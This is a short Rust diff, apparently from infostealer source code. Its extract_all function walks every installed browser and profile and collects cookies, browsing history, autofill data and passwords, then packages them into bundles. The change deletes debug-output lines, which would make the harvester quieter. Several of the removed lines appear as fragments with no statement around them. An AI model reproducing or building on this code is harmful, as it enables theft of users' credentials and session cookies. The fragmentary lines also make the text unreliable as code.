@@ -170,7 +170,6 @@ pub fn extract_all() -> Vec<(String, String)> {
     let mut results = Vec::new();
     let browsers = get_browsers();
     for browser in browsers {
-            browser.name, browser.profiles_path, browser.profiles_path.exists());
         if !browser.profiles_path.exists() { continue; }
         let nss_dir = find_nss_dir(&browser.name);
         let profiles = base::get_profiles(&browser.profiles_path);
@@ -182,10 +181,6 @@ pub fn extract_all() -> Vec<(String, String)> {
             let cookies = base::extract_cookies(&profile_path);
             let history = base::extract_history(&profile_path);
             let autofill = base::extract_autofill(&profile_path);
-
-                browser.name, profile_name,
-                passwords.is_some(), cookies.is_some(),
-                autofill.is_some(), history.is_some());
 
             crate::browsers::common::zipp::push_profile_bundle(
                 &mut results, &browser.name, &profile_name,
